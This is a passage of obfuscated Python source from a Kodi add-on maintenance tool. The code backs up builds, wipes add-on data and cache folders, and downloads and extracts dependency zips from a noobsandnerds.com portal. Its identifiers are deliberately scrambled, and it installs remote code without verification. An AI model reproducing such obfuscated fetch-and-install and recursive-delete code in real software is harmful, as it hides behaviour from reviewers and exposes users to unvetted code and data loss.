  if 38 - 38: OOO0O0O0ooooo
 if oOo0Ooo0 == 'None' :
  o0O00o ( '[COLOR=orange]Sorry this build is currently unavailable[/COLOR]' , '' , '' , '' , '' , '' , '' , '' , '' , '' )
  if 79 - 79: O00ooooo00 . oooOooOOo0OO
 if Oo00O0O != Oo00O0o0O :
  if i1iIIi11i111I ( ) and oOOo00Ooo0O != 'None' :
   if 34 - 34: OoOo0o * Ooo00oOo0oOo
   o0O00o ( '[COLOR=darkcyan]OpenELEC FRESH INSTALL[/COLOR]' , oOOo00Ooo0O , 'restore_openelec' , o00oOOoO0oO , oOOoO0OOoOoO , iIIii1iiiIiiI , OOo0 , '' , '' , '' )
   if 71 - 71: Oo00oo0oO
   if 97 - 97: oOoO0o00OO0
  o0O00o ( '[COLOR=dodgerblue]Standard Install[/COLOR]' , oOo0Ooo0 , 'restore_community' , o00oOOoO0oO , oOOoO0OOoOoO , 'merge' , OOo0 , III1I1ii , iIIii1iiiIiiI , o0o0ooOOo0oO )
  if 86 - 86: iiII11i1I1IIi - II11iIiIIIiI . Iii . Ooo00oOo0oOo * o000O0o . Ooo00oOo0oOo
  if 34 - 34: o0ii1I . OoOo0o % Oo00oo0oO - OOO0O0O0ooooo / OoOo0o
  if 91 - 91: i11iIiiIii % OoOo0o * oooOooOOo0OO - oOoO0o00OO0 . OoOo0o
  if 28 - 28: i11iIiiIii
 if iIIii1iiiIiiI != 'None' :
  if 51 - 51: o000O0o + i11Iii * OOO0O0O0ooooo . IIIIiiII111
  OOo0oO00ooO00 ( '' , '[COLOR=dodgerblue](Optional) Apply guisettings.xml fix[/COLOR]' , iIIii1iiiIiiI , 'guisettingsfix' , '' , oOOoO0OOoOoO , '' , '' )
  if 82 - 82: II11iIiIIIiI * oOoO0o00OO0 % IIIIiiII111 . II11iIiIIIiI
  if 43 - 43: o0oo . i11Iii * iiII11i1I1IIi
def iio00O0o00oo ( url ) :
 if 19 - 19: o000O0o
 iI1i1IiIIIIi = ''
 if url == 'create_pack' :
  iI1i1IiIIIIi = oOOOOoOO0o ( 'http://noobsandnerds.com/TI/AddonPortal/approved.php' , 10 )
  oOOooI1I1i11 = xbmcgui . Dialog ( ) . browse ( 3 , 'Select the folder you want to store this file in' , 'files' , '' , False , False )
  O0O0 = oO0ooo00o0o000Oo ( heading = "Enter a name for this keyword" )
  if 79 - 79: o0ii1I - Ooo00oOo0oOo
  if ( not O0O0 ) :
   return False , 0
   if 70 - 70: OoOo0o . oooOooOOo0OO % O00ooooo00 / IIii1I
  oOIIII = urllib . quote_plus ( O0O0 )
 I11 . create ( 'Backing Up Addons & Repositories' , '' , 'Please Wait...' )
 if 98 - 98: O00ooooo00 % iiII11i1I1IIi
 if not os . path . exists ( oO0Oo ) :
  os . makedirs ( oO0Oo )
  if 82 - 82: i11Iii
  if 70 - 70: IIii1I + i11iIiiIii + iiII11i1I1IIi / ooo0O0O00
 for OOo0 in os . listdir ( i1iiIII111ii ) :
  if not 'metadata' in OOo0 and not 'module' in OOo0 and not 'script.common' in OOo0 and not 'packages' in OOo0 and not 'service.xbmc.versioncheck' in OOo0 and os . path . isdir ( os . path . join ( i1iiIII111ii , OOo0 ) ) :
   try :
    I11 . update ( 0 , "Backing Up" , '[COLOR yellow]%s[/COLOR]' % OOo0 , 'Please Wait...' )
    if 9 - 9: Iii - Oo00oo0oO
    if 39 - 39: O00ooooo00
    if OOo0 in iI1i1IiIIIIi or url != 'create_pack' :
     if 19 - 19: o000O0o . o000O0o - i11iIiiIii
     if not os . path . exists ( os . path . join ( oO0Oo , 'addons' , OOo0 ) ) :
      os . makedirs ( os . path . join ( oO0Oo , 'addons' , OOo0 ) )
     shutil . copyfile ( os . path . join ( i1iiIII111ii , OOo0 , 'addon.xml' ) , os . path . join ( oO0Oo , 'addons' , OOo0 , 'addon.xml' ) )
    if not OOo0 in iI1i1IiIIIIi :
     shutil . copytree ( os . path . join ( i1iiIII111ii , OOo0 ) , os . path . join ( oO0Oo , 'addons' , OOo0 ) )
     if 61 - 61: OoOo0o * oOoO0o00OO0 % o000O0o % o0oo % o0o + o0o
    i1111I = os . path . join ( oO0Oo , 'addons' , OOo0 , 'addon.xml' )
    if 58 - 58: II1 - o0o + IIii1I * i11iIiiIii
    if 80 - 80: O00ooooo00 . o000O0o - oooOooOOo0OO + II11iIiIIIiI + ooo0O0O00 % oooOooOOo0OO
    if 13 - 13: Ooo00oOo0oOo / Iii / Iii + i11Iii
    o0o0O0O00oOOo = open ( i1111I , mode = 'r' )
    oOo0O = o0o0O0O00oOOo . read ( )
    o0o0O0O00oOOo . close ( )
    if 49 - 49: OOO0O0O0ooooo / Ooo00oOo0oOo * o000O0o - II1 . Ooo00oOo0oOo % Oo00oo0oO
    if 13 - 13: oooOooOOo0OO . IIii1I . II11iIiIIIiI . Oo00oo0oO
    ooo0OoO = re . compile ( '<addon[\s\S]*?">' ) . findall ( oOo0O )
    O00oOo0O0o00O = ooo0OoO [ 0 ] if ( len ( ooo0OoO ) > 0 ) else 'None'
    oo0oo00O0O = re . compile ( 'version="[\s\S]*?"' ) . findall ( O00oOo0O0o00O )
    iIiiI1I = oo0oo00O0O [ 0 ] if ( len ( oo0oo00O0O ) > 0 ) else '0'
    if 65 - 65: o000O0o . o000O0o % II11iIiIIIiI + i11Iii + II1 - i11iIiiIii
    if 94 - 94: oooOooOOo0OO . o0ii1I % o0ii1I % o000O0o - ooo0O0O00 / i11iIiiIii
    ooo0oOOOO00Oo = str ( O00oOo0O0o00O ) . replace ( iIiiI1I , 'version="0.0.0.1"' )
    iIIIiIi = oOo0O . replace ( O00oOo0O0o00O , ooo0oOOOO00Oo )
    if 48 - 48: Ooo00oOo0oOo + Ooo00oOo0oOo * O00ooooo00 / IIIIiiII111
    oo000oOO00o0oOO = open ( i1111I , mode = 'w' )
    oo000oOO00o0oOO . write ( str ( iIIIiIi ) )
    oo000oOO00o0oOO . close ( )
    if 37 - 37: IIii1I % o0o / Oo00oo0oO
   except :
    if IiII == 'true' :
     print "### Failed to create: " + OOo0 + ' ###'
     if 37 - 37: OoOo0o - oooOooOOo0OO - o0oo
 if url == 'create_pack' :
  IIi11iII11i1 = [ '.svn' , '.git' ]
  ii11111I = [ '.DS_Store' , 'Thumbs.db' , '.gitignore' ]
  IiI1IIiiiii = os . path . join ( oOOooI1I1i11 , oOIIII + '.zip' )
  o00Ooo0 ( oO0Oo , IiI1IIiiiii , 'Creating Addons Archive' , '' , '' , '' , IIi11iII11i1 , ii11111I )
  try :
   shutil . rmtree ( oO0Oo )
  except :
   pass
  i11 . ok ( 'New Keyword Created' , 'Please read the instructions on how to share this keyword with the community. Your zip file can be found at:' , '[COLOR=dodgerblue]' + IiI1IIiiiii + '[/COLOR]' )
  if 43 - 43: oooOooOOo0OO - Oo00oo0oO % i11iIiiIii * Ooo00oOo0oOo . OoOo0o - o0o
  if 13 - 13: o0oo
def O00 ( name ) :
 if 91 - 91: oOoO0o00OO0 + IIii1I % Oo00oo0oO
 IIIIIiI11Ii = open ( IIIII , mode = 'r' )
 oOo0O = IIIIIiI11Ii . read ( )
 IIIIIiI11Ii . close ( )
 oOOoOOO0oOoo = re . compile ( 'name="(.+?)"' ) . findall ( oOo0O )
 o0O0ooooooo00 = oOOoOOO0oOoo [ 0 ] if ( len ( oOOoOOO0oOoo ) > 0 ) else 'None'
 IiIiI1i1 = [ ]
 if 90 - 90: i11Iii - o0o . o0oo + o0oo
 if 45 - 45: Iii / II1 . OoOo0o % OOO0O0O0ooooo * oOoO0o00OO0 * iiII11i1I1IIi
 if o0O0ooooooo00 == 'None' or o0O0ooooooo00 == 'unknown' :
  OO0OooOo = 0
  i11 . ok ( 'No Profile Set' , "There's no profile name set to the build you're currently running. Please enter a name for this build so we can save it and make sure no data is lost." )
  O0O0 = oO0ooo00o0o000Oo ( heading = "Enter a name for this backup" )
  if ( not O0O0 ) :
   return False , 0
  O0O0 = O0O0 . replace ( ' ' , '_' )
  oOIIII = urllib . quote_plus ( O0O0 )
  if os . path . exists ( os . path . join ( oO , oOIIII ) ) :
   OO0OooOo = 0
   while not OO0OooOo :
    i11 . ok ( 'PROFILE ALREADY EXISTS' , "There is already a profile on your system with this name. Please choose another name for this profile." )
    O0O0 = oO0ooo00o0o000Oo ( heading = "Enter a name for existing profile" )
    if ( not O0O0 ) :
     return False , 0
    O0O0 = O0O0 . replace ( ' ' , '_' )
    oOIIII = urllib . quote_plus ( O0O0 )
    if not os . path . exists ( os . path . join ( oO , oOIIII ) ) :
     OO0OooOo = 1
     if 65 - 65: o0ii1I + OoOo0o - OOO0O0O0ooooo
  os . makedirs ( os . path . join ( oO , oOIIII ) )
  i1I1Iiii = oOIIII
  IIIIIiI11Ii = open ( IIIII , 'w' )
  iIIIiIi = oOo0O . replace ( 'id="None"' , 'id="Local"' ) . replace ( 'name="None"' , 'name="' + str ( i1I1Iiii ) + '"' )
  IIIIIiI11Ii . write ( iIIIiIi )
  IIIIIiI11Ii . close ( )
  if 15 - 15: i11Iii % o0ii1I / oooOooOOo0OO - Ooo00oOo0oOo . IIii1I
  if 28 - 28: Ooo00oOo0oOo * i11Iii * IIIIiiII111
  for O0oO0 in os . listdir ( i1iIIi1 ) :
   IiIiI1i1 . append ( O0oO0 )
   if 93 - 93: O00ooooo00 . IIIIiiII111 * OoOo0o . i11Iii
  O0iI1I1ii11IIi1 = open ( os . path . join ( oO , oOIIII , 'addonlist' ) , mode = 'w+' )
  for O0oO0 in os . listdir ( i1iiIII111ii ) :
   if not O0oO0 in IiIiI1i1 and O0oO0 != 'plugin.program.totalinstaller' and O0oO0 != 'packages' :
    O0iI1I1ii11IIi1 . write ( O0oO0 + '|' )
  O0iI1I1ii11IIi1 . close ( )
  if 100 - 100: iiII11i1I1IIi . IIIIiiII111 . o000O0o % Ooo00oOo0oOo - oooOooOOo0OO
  i1iii1IiiiI1i1 = [ 'addons' , 'cache' , 'CP_Profiles' , 'system' , 'temp' , 'Thumbnails' ]
  IIIiI1i1 = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , '.gitignore' , 'addons*.db' , 'textures13.db' ]
  I111iiiii1 = "Creating backup of existing build"
  OO0ooOoOO0OOo = "Archiving..."
  OooOoooo0000 = ""
  I1ii1i11i = "Please Wait"
  o00Ooo0 ( Oo0o0000o0o0 , os . path . join ( oO , oOIIII , 'build.zip' ) , I111iiiii1 , OO0ooOoOO0OOo , OooOoooo0000 , I1ii1i11i , i1iii1IiiiI1i1 , IIIiI1i1 )
  if 52 - 52: o000O0o % o0oo * IIIIiiII111 * ooo0O0O00 / II11iIiIIIiI
  if 88 - 88: oooOooOOo0OO
  if 1 - 1: iiII11i1I1IIi
 else :
  i1I1Iiii = o0O0ooooooo00 . replace ( ' ' , '_' ) . replace ( ':' , '-' ) . replace ( "'" , '' )
  if 95 - 95: II1 / o0o % II1 / i11Iii * Oo00oo0oO
  O0iI1I1ii11IIi1 = open ( os . path . join ( oO , i1I1Iiii , 'addonlist' ) , mode = 'w+' )
  for O0oO0 in os . listdir ( i1iiIII111ii ) :
   if not O0oO0 in IiIiI1i1 and O0oO0 != 'plugin.program.totalinstaller' and O0oO0 != 'packages' :
    O0iI1I1ii11IIi1 . write ( O0oO0 + '|' )
  O0iI1I1ii11IIi1 . close ( )
  if 75 - 75: OOO0O0O0ooooo
  i1iii1IiiiI1i1 = [ 'addons' , 'cache' , 'CP_Profiles' , 'system' , 'temp' , 'Thumbnails' ]
  IIIiI1i1 = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , '.gitignore' , 'addons*.db' , 'textures13.db' ]
  I111iiiii1 = "Creating backup of existing build"
  OO0ooOoOO0OOo = "Archiving..."
  OooOoooo0000 = ""
  I1ii1i11i = "Please Wait"
  o00Ooo0 ( Oo0o0000o0o0 , os . path . join ( oO , i1I1Iiii , 'build.zip' ) , I111iiiii1 , OO0ooOoOO0OOo , OooOoooo0000 , I1ii1i11i , i1iii1IiiiI1i1 , IIIiI1i1 )
 return i1I1Iiii
 if 56 - 56: o0oo / Ooo00oOo0oOo
 if 39 - 39: Iii - II1 - O00ooooo00 / Ooo00oOo0oOo
def IIIii1 ( db_path ) :
 global cur
 global con
 con = database . connect ( db_path )
 cur = con . cursor ( )
 if 76 - 76: o000O0o * II11iIiIIIiI
 if 12 - 12: IIii1I / o0o % IIIIiiII111
def IIiiI11 ( ) :
 IiIII = xbmc . translatePath ( os . path . join ( 'special://home/userdata/addon_data' , '' ) )
 if 92 - 92: o000O0o % ooo0O0O00
 for iiiI1IiI , OoIIi1iI , oO0Ooo0OooOOo in os . walk ( IiIII ) :
  Ii111IIIIii = 0
  Ii111IIIIii += len ( oO0Ooo0OooOOo )
  if 54 - 54: ooo0O0O00 / o000O0o * o0o / i11iIiiIii * OoOo0o . IIii1I
  if Ii111IIIIii >= 0 :
   if 40 - 40: o000O0o . IIIIiiII111 / O00ooooo00
   for Oo0oO00 in oO0Ooo0OooOOo :
    os . unlink ( os . path . join ( iiiI1IiI , Oo0oO00 ) )
    if 28 - 28: IIIIiiII111
   for OOOOI1iI1i11 in OoIIi1iI :
    shutil . rmtree ( os . path . join ( iiiI1IiI , OOOOI1iI1i11 ) )
    if 66 - 66: o0o
    if 27 - 27: OOO0O0O0ooooo
def Oo0Oo0 ( ) :
 for oooOooooO in glob . glob ( os . path . join ( I1IIiiIiii , 'xbmc_crashlog*.*' ) ) :
  i1I = oooOooooO
  os . remove ( oooOooooO )
  i11 = xbmcgui . Dialog ( )
  i11 . ok ( "Crash Logs Deleted" , "Your old crash logs have now been deleted." )
  if 49 - 49: O00ooooo00 - Iii . iiII11i1I1IIi + IIii1I - i11Iii / iiII11i1I1IIi
  if 24 - 24: oooOooOOo0OO - ooo0O0O00 / i11Iii
def i1iI ( ) :
 iIiiII1Ii1ii = xbmc . translatePath ( os . path . join ( 'special://home/addons/packages' , '' ) )
 if 34 - 34: o000O0o
 for iiiI1IiI , OoIIi1iI , oO0Ooo0OooOOo in os . walk ( iIiiII1Ii1ii ) :
  Ii111IIIIii = 0
  Ii111IIIIii += len ( oO0Ooo0OooOOo )
  if 57 - 57: II11iIiIIIiI . IIIIiiII111 % o0ii1I
  if Ii111IIIIii > 0 :
   if 32 - 32: o0o / Oo00oo0oO - OOO0O0O0ooooo * IIii1I
   for Oo0oO00 in oO0Ooo0OooOOo :
    os . unlink ( os . path . join ( iiiI1IiI , Oo0oO00 ) )
    if 70 - 70: II1 % II1 % o0oo
   for OOOOI1iI1i11 in OoIIi1iI :
    shutil . rmtree ( os . path . join ( iiiI1IiI , OOOOI1iI1i11 ) )
    if 98 - 98: o0oo
    if 18 - 18: o0o + iiII11i1I1IIi - o0oo / OoOo0o / II11iIiIIIiI
def OOoOoO ( path ) :
 oO000o0Oo00 = i11 . yesno ( 'Are you certain?' , 'This will completely wipe this folder, are you absolutely certain you want to continue? There is NO going back after this!' )
 if oO000o0Oo00 == 1 :
  I11 . create ( "Cleaning Folders" , "Wiping..." , '' , 'Please Wait' )
  shutil . rmtree ( path , ignore_errors = True )
  I11 . close ( )
  xbmc . executebuiltin ( 'container.Refresh' )
  if 72 - 72: Iii / OoOo0o * Oo00oo0oO % IIii1I
  if 53 - 53: o0oo . OOO0O0O0ooooo . o000O0o * II11iIiIIIiI / o0ii1I
def iiIIiI1 ( url ) :
 for OOo0 in os . listdir ( oO ) :
  if OOo0 != 'Master' and OOo0 != url . replace ( ' ' , '_' ) . replace ( "'" , '' ) . replace ( ':' , '-' ) :
   OOo0oO00ooO00 ( '' , '[COLOR=darkcyan]DELETE[/COLOR] ' + OOo0 . replace ( '_' , ' ' ) , os . path . join ( oO , OOo0 ) , 'delete_path' , '' , '' , '' , '' )
   if 28 - 28: oOoO0o00OO0 * oooOooOOo0OO / Ooo00oOo0oOo + II11iIiIIIiI - OOO0O0O0ooooo
   if 16 - 16: Ooo00oOo0oOo / IIIIiiII111 . IIIIiiII111 - IIIIiiII111 / oOoO0o00OO0
def I1Ii11i1ii1i ( ) :
 IiIII = xbmc . translatePath ( os . path . join ( 'special://home/userdata/addon_data' , '' ) )
 if 90 - 90: o0ii1I
 for iiiI1IiI , OoIIi1iI , oO0Ooo0OooOOo in os . walk ( IiIII ) :
  Ii111IIIIii = 0
  Ii111IIIIii += len ( oO0Ooo0OooOOo )
  if 44 - 44: o0ii1I / oOoO0o00OO0 . iiII11i1I1IIi + Iii
  if Ii111IIIIii >= 0 :
   if 32 - 32: Oo00oo0oO - i11Iii * ooo0O0O00 * o0o
   for Oo0oO00 in oO0Ooo0OooOOo :
    os . unlink ( os . path . join ( iiiI1IiI , Oo0oO00 ) )
    if 84 - 84: IIIIiiII111 + oOoO0o00OO0 % o000O0o + i11iIiiIii
   for OOOOI1iI1i11 in OoIIi1iI :
    shutil . rmtree ( os . path . join ( iiiI1IiI , OOOOI1iI1i11 ) )
    if 37 - 37: o0o % oOoO0o00OO0 / i11Iii
    if 94 - 94: o0o / o0oo . o0ii1I
def III1II1i ( ) :
 I11 . create ( 'Checking dependencies' , '' , 'Please Wait...' )
 iIiOo = [ ]
 if 48 - 48: II11iIiIIIiI
 for OOo0 in os . listdir ( i1iiIII111ii ) :
  if OOo0 != 'packages' :
   try :
    I1111III111ii = os . path . join ( i1iiIII111ii , OOo0 , 'addon.xml' )
    o0oO0oOooO = open ( I1111III111ii , mode = 'r' )
    oo00o00O0 = o0oO0oOooO . read ( )
    o0oO0oOooO . close ( )
    O00o0O = re . compile ( 'import addon="(.+?)"' ) . findall ( oo00o00O0 )
    if 73 - 73: o0oo
    for oOoo000 in O00o0O :
     if 28 - 28: II1 - o0o
     if not 'xbmc.python' in oOoo000 and not oOoo000 in iIiOo :
      iIiOo . append ( oOoo000 )
      print 'Script Requires --- ' + oOoo000
   except :
    pass
    if 84 - 84: Ooo00oOo0oOo
 return iIiOo
 if 36 - 36: II11iIiIIIiI - Iii - IIii1I
 if 10 - 10: oOoO0o00OO0 / IIIIiiII111 * O00ooooo00 % OOO0O0O0ooooo + o0o
def OO00OOoO0o ( name , addon_id ) :
 Oo0000O0OOooO = 1
 O0O0o0o0o = 1
 I1111III111ii = xbmc . translatePath ( os . path . join ( i1iiIII111ii , addon_id , 'addon.xml' ) )
 o0oO0oOooO = open ( I1111III111ii , mode = 'r' )
 oo00o00O0 = o0oO0oOooO . read ( )
 o0oO0oOooO . close ( )
 O00o0O = re . compile ( 'import addon="(.+?)"' ) . findall ( oo00o00O0 )
 if 25 - 25: OoOo0o - IIIIiiII111 / OOO0O0O0ooooo . II1 % o000O0o . O00ooooo00
 for oOoo000 in O00o0O :
  if 19 - 19: Ooo00oOo0oOo / Ooo00oOo0oOo % oOoO0o00OO0 + oooOooOOo0OO + oooOooOOo0OO + ooo0O0O00
  if not 'xbmc.python' in oOoo000 :
   print 'Script Requires --- ' + oOoo000
   IIi1I1 = xbmc . translatePath ( os . path . join ( i1iiIII111ii , oOoo000 ) )
   if 80 - 80: o0ii1I % ooo0O0O00
   if not os . path . exists ( IIi1I1 ) :
    OO = 'http://noobsandnerds.com/TI/AddonPortal/dependencyinstall.php?id=%s' % ( oOoo000 )
    Ii1iI111II1I1 = oOOOOoOO0o ( OO , 10 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
    o0ooooO0o0O = re . compile ( 'name="(.+?)"' ) . findall ( Ii1iI111II1I1 )
    iI1i111I1Ii = re . compile ( 'version="(.+?)"' ) . findall ( Ii1iI111II1I1 )
    II11iIIiiiII = re . compile ( 'repo_url="(.+?)"' ) . findall ( Ii1iI111II1I1 )
    OoOoo00Ooo00 = re . compile ( 'data_url="(.+?)"' ) . findall ( Ii1iI111II1I1 )
    oo0O00Oooo0O0 = re . compile ( 'zip_url="(.+?)"' ) . findall ( Ii1iI111II1I1 )
    OO0 = re . compile ( 'repo_id="(.+?)"' ) . findall ( Ii1iI111II1I1 )
    ooOooOooOOO = o0ooooO0o0O [ 0 ] if ( len ( o0ooooO0o0O ) > 0 ) else ''
    IIIIIo0ooOoO000oO = iI1i111I1Ii [ 0 ] if ( len ( iI1i111I1Ii ) > 0 ) else ''
    oO0oOOOo0o = II11iIIiiiII [ 0 ] if ( len ( II11iIIiiiII ) > 0 ) else ''
    i1II1iII1 = OoOoo00Ooo00 [ 0 ] if ( len ( OoOoo00Ooo00 ) > 0 ) else ''
    I11II11IiI11 = oo0O00Oooo0O0 [ 0 ] if ( len ( oo0O00Oooo0O0 ) > 0 ) else ''
    O00o = OO0 [ 0 ] if ( len ( OO0 ) > 0 ) else ''
    Ii11Iiii1iiii = xbmc . translatePath ( os . path . join ( I11i1I1I , ooOooOooOOO + '.zip' ) )
    if 10 - 10: ooo0O0O00 % iiII11i1I1IIi
    I11 . create ( 'Downloading Dependencies' , 'Installing [COLOR=yellow]' + ooOooOooOOO , '' , '' )
    if 48 - 48: II11iIiIIIiI + OoOo0o % II11iIiIIIiI
    try :
     downloader . download ( oO0oOOOo0o , Ii11Iiii1iiii , I11 )
     extract . all ( Ii11Iiii1iiii , i1iiIII111ii , I11 )
     if 84 - 84: OOO0O0O0ooooo % IIIIiiII111 . IIIIiiII111 . ooo0O0O00 * o0o
    except :
     if 43 - 43: Iii . oOoO0o00OO0 % O00ooooo00
     try :
      downloader . download ( I11II11IiI11 , Ii11Iiii1iiii , I11 )
      extract . all ( Ii11Iiii1iiii , i1iiIII111ii , I11 )
      if 61 - 61: o000O0o + oooOooOOo0OO % OoOo0o % IIii1I - II1
     except :
      if 22 - 22: II11iIiIIIiI + Ooo00oOo0oOo + iiII11i1I1IIi
      try :
       if 83 - 83: i11Iii
       if not os . path . exists ( IIi1I1 ) :
        os . makedirs ( IIi1I1 )
        if 43 - 43: II11iIiIIIiI
       Ii1iI111II1I1 = oOOOOoOO0o ( i1II1iII1 , 10 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
       O0OO0O = re . compile ( 'href="(.+?)"' , re . DOTALL ) . findall ( Ii1iI111II1I1 )
       if 84 - 84: II11iIiIIIiI . Oo00oo0oO . ooo0O0O00
       for Ii1 in O0OO0O :
        ooo0ooO = xbmc . translatePath ( os . path . join ( IIi1I1 , Ii1 ) )
        if 2 - 2: iiII11i1I1IIi - Iii
        if addon_id not in Ii1 and '/' not in Ii1 :
         if 49 - 49: IIIIiiII111 + Ooo00oOo0oOo / oooOooOOo0OO - Iii % Iii + o000O0o
         try :
          I11 . update ( 0 , '' , 'Downloading [COLOR=yellow]' + Ii1 + '[/COLOR]' , 'Please wait...' )
          downloader . download ( i1II1iII1 + Ii1 , ooo0ooO , I11 )
          if 54 - 54: i11Iii % iiII11i1I1IIi - II11iIiIIIiI
         except :
          print "failed to install" + Ii1
          if 16 - 16: oOoO0o00OO0 * ooo0O0O00 / o0o
        if '/' in Ii1 and '..' not in Ii1 and 'http' not in Ii1 :
         oo0OOOoOo = i1II1iII1 + Ii1
         IIiiIIi1 ( ooo0ooO , oo0OOOoOo )
         if 46 - 46: Ooo00oOo0oOo
      except :
       i11 . ok ( "Error downloading dependency" , 'There was an error downloading [COLOR=dodgerblue]' + ooOooOooOOO + '[/COLOR]. Please consider updating the add-on portal with details or report the error on the forum at WWW.NOOBSANDNERDS.COM' )
       O0O0o0o0o = 0
       Oo0000O0OOooO = 0
       if 13 - 13: Oo00oo0oO + Ooo00oOo0oOo % o000O0o
    if O0O0o0o0o == 1 :
     time . sleep ( 1 )
     I11 . update ( 0 , "[COLOR=yellow]" + ooOooOooOOO + '[/COLOR]  [COLOR=lime]Successfully Installed[/COLOR]' , '' , 'Please wait...' )
     time . sleep ( 1 )
     OO0O0ooOOO00 = 'http://noobsandnerds.com/TI/AddonPortal/downloadcount.php?id=%s' % ( oOoo000 )
     try :
      oOOOOoOO0o ( OO0O0ooOOO00 , 5 )
     except :
      pass
 I11 . close ( )
 time . sleep ( 1 )
 if 30 - 30: II1 - i11iIiiIii + oooOooOOo0OO / iiII11i1I1IIi - i11iIiiIii
 if 74 - 74: OOO0O0O0ooooo . o0o
def o00o0 ( name , url , buildname , author , version , description , updated , skins , videoaddons , audioaddons , programaddons , pictureaddons , sources , adult ) :
 IIi1IiII ( buildname + '     v.' + version , '[COLOR=yellow][B]Author:   [/B][/COLOR]' + author + '[COLOR=yellow][B]               Last Updated:   [/B][/COLOR]' + updated + '[COLOR=yellow][B]               Adult Content:   [/B][/COLOR]' + adult + '[CR][CR][COLOR=yellow][B]Description:[CR][/B][/COLOR]' + description +
 '[CR][CR][COLOR=blue][B]Skins:   [/B][/COLOR]' + skins + '[CR][CR][COLOR=blue][B]Video Addons:   [/B][/COLOR]' + videoaddons + '[CR][CR][COLOR=blue][B]Audio Addons:   [/B][/COLOR]' + audioaddons +
 '[CR][CR][COLOR=blue][B]Program Addons:   [/B][/COLOR]' + programaddons + '[CR][CR][COLOR=blue][B]Picture Addons:   [/B][/COLOR]' + pictureaddons + '[CR][CR][COLOR=blue][B]Sources:   [/B][/COLOR]' + sources +
 '[CR][CR][COLOR=orange]Disclaimer: [/COLOR]These are community builds and they may overwrite some of your existing settings, '
 'It\'s purely the responsibility of the user to choose whether or not they wish to install these builds, the individual who uploads the build should state what\'s included and then it\'s the users decision to decide whether or not that content is suitable for them.' )
 if 84 - 84: Iii - iiII11i1I1IIi . i11Iii . Oo00oo0oO - iiII11i1I1IIi
 if 99 - 99: OoOo0o
def o0I1IiiiiI1i1I ( path ) :
 I11 . create ( "Cleaning Folders" , "Wiping..." , '' , 'Please Wait' )
 shutil . rmtree ( path , ignore_errors = True )
 if 48 - 48: o0o + Ooo00oOo0oOo % oooOooOOo0OO % II11iIiIIIiI * Ooo00oOo0oOo
 if 41 - 41: o0oo
def i1iiiiii1 ( ) :
 OOo0oO00ooO00 ( '' , "[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]" , '' , '' , 'mainmenu/maintenance.png' , '' , '' , '' )
 OoO0oOOOO = glob . glob ( os . path . join ( i1iiIII111ii , '*/' ) )
 for o0oo00OOOo in sorted ( OoO0oOOOO , key = lambda oo0oO : oo0oO ) :
  if OO0o in o0oo00OOOo : continue
  I1111III111ii = os . path . join ( o0oo00OOOo , 'addon.xml' )
  if os . path . exists ( I1111III111ii ) :
   OoO0oOOOO = o0oo00OOOo . replace ( i1iiIII111ii , '' ) [ 1 : - 1 ]
   Oo0oO00 = open ( I1111III111ii )
   Ii11iiI1 = Oo0oO00 . read ( ) . replace ( '\n' , '' ) . replace ( '\r' , '' ) . replace ( '\t' , '' )
   O0OO0O = re . compile ( '<addo.+?id="(.+?)".+?>' ) . findall ( Ii11iiI1 )
   i1i1IIi = re . compile ( '<addo.+? name="(.+?)".+?>' ) . findall ( Ii11iiI1 )
   try :
    o0oo0Ooo0 = O0OO0O [ 0 ]
    OOo0 = i1i1IIi [ 0 ]
   except :
    continue
   try :
    o0OOoO = xbmcaddon . Addon ( id = o0oo0Ooo0 )
    I1iII1II1I1ii = "[COLOR green][Enabled][/COLOR]"
    oo0OO0O = "false"
   except :
    I1iII1II1I1ii = "[COLOR red][Disabled][/COLOR]"
    oo0OO0O = "true"
    pass
   IiI11i1IIiiI = os . path . join ( o0oo00OOOo , 'icon.png' ) if os . path . exists ( os . path . join ( o0oo00OOOo , 'icon.png' ) ) else OOooO0OOoo
   oOOoO0OOoOoO = os . path . join ( o0oo00OOOo , 'fanart.jpg' ) if os . path . exists ( os . path . join ( o0oo00OOOo , 'fanart.jpg' ) ) else iI111I11I1I1
   OOo0oO00ooO00 ( 'addon' , "%s %s" % ( I1iII1II1I1ii , OOo0 ) , "%s[]%s" % ( OoO0oOOOO , oo0OO0O ) , 'toggleaddon' , IiI11i1IIiiI , oOOoO0OOoOoO , '' , '' )
   Oo0oO00 . close ( )
   if 64 - 64: oooOooOOo0OO . oOoO0o00OO0 * OoOo0o % o000O0o
def i1II ( ) :
 os . remove ( IIIII )
 os . rename ( ooooooO0oo , IIIII )
 xbmc . executebuiltin ( 'UnloadSkin' )
 xbmc . executebuiltin ( "ReloadSkin" )
 i11 . ok ( "Local Restore Complete" , 'XBMC/Kodi will now close.' , '' , '' )
 xbmc . executebuiltin ( "Quit" )
 if 25 - 25: OOO0O0O0ooooo + o0o + II11iIiIIIiI * oOoO0o00OO0
 if 87 - 87: iiII11i1I1IIi . II1 * OoOo0o * Ooo00oOo0oOo / O00ooooo00 * Iii
def OooO00oo0O0 ( url ) :
 I11 . create ( "Changing Physical Paths To Special" , "Renaming paths..." , '' , 'Please Wait' )
 for iiiI1IiI , OoIIi1iI , oO0Ooo0OooOOo in os . walk ( url ) :
  for file in oO0Ooo0OooOOo :
   if file . endswith ( ".xml" ) or file . endswith ( ".hash" ) or file . endswith ( "properies" ) :
    I11 . update ( 0 , "Fixing" , file , 'Please Wait' )
    Ii11iiI1 = open ( ( os . path . join ( iiiI1IiI , file ) ) ) . read ( )
    I11IiIi1iI1ii = urllib . quote ( Oo0o0000o0o0 )
    O0oOo0o0OOoO0 = urllib . quote ( Oo0o0000o0o0 ) . replace ( '%3A' , '%3a' ) . replace ( '%5C' , '%5c' )
    i1I1IIIiii1 = Ii11iiI1 . replace ( Oo0o0000o0o0 , 'special://home/' ) . replace ( I11IiIi1iI1ii , 'special://home/' ) . replace ( O0oOo0o0OOoO0 , 'special://home/' )
    Oo0oO00 = open ( ( os . path . join ( iiiI1IiI , file ) ) , mode = 'w' )
    Oo0oO00 . write ( str ( i1I1IIIiii1 ) )
    Oo0oO00 . close ( )
    if 76 - 76: II1
    if 42 - 42: IIIIiiII111 * OOO0O0O0ooooo / oooOooOOo0OO
def IiiiI11 ( ) :
